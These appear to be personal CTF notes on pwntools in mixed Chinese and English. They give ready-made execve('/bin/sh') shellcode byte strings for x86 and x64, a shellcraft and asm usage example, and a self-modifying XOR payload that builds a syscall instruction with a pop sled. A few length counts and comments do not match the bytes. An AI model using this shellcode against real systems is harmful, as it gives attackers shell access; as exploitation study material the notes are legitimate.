```sh
# 全部使用
pwn shellcraft -l
```

# shellcraft/orw
https://docs.pwntools.com/en/stable/shellcraft.html
常用 cat/read/open/write

# 一定要用 b'' 或 encode('latin')。否则flat时会用 utf格式编码字符就不对了
```sh
# https://github.com/yyanyi213/pwn/blob/master/shellcode
# len -- 21
shellcode_x86 = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
# len -- 22
shellcode_x64 = b'\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\x31\xF6\x31\xD2\x6A\x3B\x58\x0F\x05 '
# len -- 24
shellcode_x64 = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```


# asm

```python
from pwn import asm
assembly_code = """
    ret
"""
shellcode = asm(assembly_code)
print(shellcode)
# print(disasm(shellcode)) # 汇编
```


```sh
payload =  b'\x33\x42\x38'  # 33 42 38 xor eax, DWORD PTR [rdx+0x38] : eax=0 => eax=0x41414141
payload += b'\x31\x42\x30'  # 31 42 30 xor DWORD PTR [rdx+0x30], eax : eax ^ \x4e\x44\x4e\x44 = 0x0f    0x05    0x0f    0x05
payload += b'\x33\x42\x37'  # 33 42 38 xor eax, DWORD PTR [rdx+0x38] : eax = 0
payload += b'\x31\x42\x38'  # 31 42 38 xor DWORD PTR [rdx+0x38], eax : 无效果, 上面eax已经为0了
payload += b'\x59' * (0x30 - len(payload))  # 59 pop rcx : 一直pop到syscall前 , pop滑板
payload += b'\x4e\x44' * 2  # syscall  0x4e^0x41=0xf 0x44^0x41=0x5 , [rdx+0x30] = \x4e\x40\x4e\x40
payload += b'A' * 8  # xor key
```